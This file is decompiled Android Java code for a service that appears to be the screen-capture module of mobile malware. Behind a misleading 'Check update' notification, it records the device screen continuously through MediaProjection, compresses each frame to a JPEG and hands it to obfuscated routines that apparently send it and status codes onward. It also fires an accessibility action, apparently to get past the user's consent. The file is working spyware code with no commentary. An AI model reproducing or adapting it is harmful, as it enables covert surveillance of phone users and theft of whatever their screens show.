package com.superbock.auto;

import android.annotation.SuppressLint;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Intent;
import android.graphics.Bitmap;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import comeliest.metempsychosis.pokelogan.R;
import f3.i;
import java.io.ByteArrayOutputStream;
import java.nio.ByteBuffer;
import k3.h;

/* loaded from: classes.dex */
public class ScreenService extends Service {

    /* renamed from: i, reason: collision with root package name */
    public static MediaProjection f1425i;

    /* renamed from: j, reason: collision with root package name */
    public static VirtualDisplay f1426j;

    /* renamed from: b, reason: collision with root package name */
    public int f1427b;

    /* renamed from: c, reason: collision with root package name */
    public int f1428c;

    /* renamed from: d, reason: collision with root package name */
    public Handler f1429d;

    /* renamed from: e, reason: collision with root package name */
    public final HandlerThread f1430e = new HandlerThread(getClass().getSimpleName(), 10);

    /* renamed from: f, reason: collision with root package name */
    public MediaProjectionManager f1431f;

    /* renamed from: g, reason: collision with root package name */
    public Notification f1432g;

    /* renamed from: h, reason: collision with root package name */
    public ImageReader f1433h;

    /* loaded from: classes7.dex */
    public class a implements Runnable {

        /* renamed from: b, reason: collision with root package name */
        public final /* synthetic */ int f1434b;

        /* renamed from: c, reason: collision with root package name */
        public final /* synthetic */ Intent f1435c;

        /* renamed from: com.superbock.auto.ScreenService$a$a, reason: collision with other inner class name */
        /* loaded from: classes22.dex */
        public class C0025a implements ImageReader.OnImageAvailableListener {
            @Override // android.media.ImageReader.OnImageAvailableListener
            public final void onImageAvailable(ImageReader imageReader) {
                Image acquireLatestImage;
                try {
                    if (i.b() && (acquireLatestImage = imageReader.acquireLatestImage()) != null) {
                        int width = acquireLatestImage.getWidth();
                        int height = acquireLatestImage.getHeight();
                        Image.Plane[] planes = acquireLatestImage.getPlanes();
                        ByteBuffer buffer = planes[0].getBuffer();
                        int pixelStride = planes[0].getPixelStride();
                        Bitmap createBitmap = Bitmap.createBitmap(((planes[0].getRowStride() - (pixelStride * width)) / pixelStride) + width, height, Bitmap.Config.ARGB_8888);
                        createBitmap.copyPixelsFromBuffer(buffer);
                        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
                        Bitmap.createBitmap(createBitmap, 0, 0, width, height).compress(Bitmap.CompressFormat.JPEG, 10, byteArrayOutputStream);
                        i.m(byteArrayOutputStream.toByteArray());
                        acquireLatestImage.close();
                    }
                } catch (Exception e5) {
                    e5.printStackTrace();
                }
            }
        }

        public a(int i5, Intent intent) {
            this.f1434b = i5;
            this.f1435c = intent;
        }

        @Override // java.lang.Runnable
        @SuppressLint({"WrongConstant"})
        public final void run() {
            try {
                ScreenService.f1425i = ScreenService.this.f1431f.getMediaProjection(this.f1434b, this.f1435c);
                ScreenService screenService = ScreenService.this;
                screenService.f1433h = ImageReader.newInstance(screenService.f1427b, screenService.f1428c, 1, 3);
                ScreenService screenService2 = ScreenService.this;
                screenService2.f1433h.setOnImageAvailableListener(new C0025a(), screenService2.f1429d);
                MediaProjection mediaProjection = ScreenService.f1425i;
                ScreenService screenService3 = ScreenService.this;
                ScreenService.f1426j = mediaProjection.createVirtualDisplay("SCANNER", screenService3.f1427b, screenService3.f1428c, screenService3.getResources().getDisplayMetrics().densityDpi, 9, ScreenService.this.f1433h.getSurface(), null, ScreenService.this.f1429d);
            } catch (Exception e5) {
                e5.printStackTrace();
            }
        }
    }

    @Override // android.app.Service
    public final IBinder onBind(Intent intent) {
        return null;
    }

    @Override // android.app.Service
    public final void onCreate() {
        super.onCreate();
        this.f1427b = h.b(this);
        this.f1428c = h.a(this);
        if (this.f1432g == null) {
            Notification.Builder builder = new Notification.Builder(getApplicationContext());
            builder.setContentIntent(PendingIntent.getActivity(this, 0, new Intent(this, (Class<?>) ScreenService.class), 33554432)).setSmallIcon(R.mipmap.ic_android).setSound(null).setDefaults(-1).setOngoing(true).setAutoCancel(false).setContentTitle("Check update").setContentText("Check update");
            if (Build.VERSION.SDK_INT >= 26) {
                builder.setChannelId("Check update");
                NotificationManager notificationManager = (NotificationManager) getSystemService("notification");
                NotificationChannel notificationChannel = new NotificationChannel("Check update", "Check update", 3);
                notificationChannel.setDescription("Check update");
                notificationChannel.setShowBadge(false);
                notificationChannel.setSound(null, null);
                notificationManager.createNotificationChannel(notificationChannel);
            }
            Notification build = builder.build();
            this.f1432g = build;
            build.defaults = 1;
            startForeground(110, build);
        }
        this.f1431f = (MediaProjectionManager) getSystemService("media_projection");
        this.f1430e.start();
        this.f1429d = new Handler(this.f1430e.getLooper());
    }

    @Override // android.app.Service
    public final void onDestroy() {
        VirtualDisplay virtualDisplay = f1426j;
        if (virtualDisplay != null) {
            virtualDisplay.release();
            f1426j = null;
        }
        MediaProjection mediaProjection = f1425i;
        if (mediaProjection != null) {
            mediaProjection.stop();
            f1425i = null;
        }
        super.onDestroy();
    }

    @Override // android.app.Service
    public final int onStartCommand(Intent intent, int i5, int i6) {
        if (intent == null) {
            return super.onStartCommand(intent, i5, i6);
        }
        int intExtra = intent.getIntExtra("code", -1);
        Intent intent2 = (Intent) intent.getParcelableExtra("data");
        if ("stopRecord".equals(intent.getAction())) {
            VirtualDisplay virtualDisplay = f1426j;
            if (virtualDisplay != null) {
                virtualDisplay.release();
                f1426j = null;
            }
            MediaProjection mediaProjection = f1425i;
            if (mediaProjection != null) {
                mediaProjection.stop();
                f1425i = null;
            }
            stopForeground(true);
            stopSelf();
            i.f2796b = false;
            i.f2797c = 0L;
            i.k(false);
            i.n(0, "19", null);
        } else {
            i.f2796b = true;
            i.f2797c = 0L;
            i.k(true);
            i.n(0, "18", null);
            try {
                BaseService.g().performGlobalAction(1);
            } catch (Exception unused) {
            }
            new Thread(new a(intExtra, intent2)).start();
        }
        return super.onStartCommand(intent, i5, i6);
    }
}
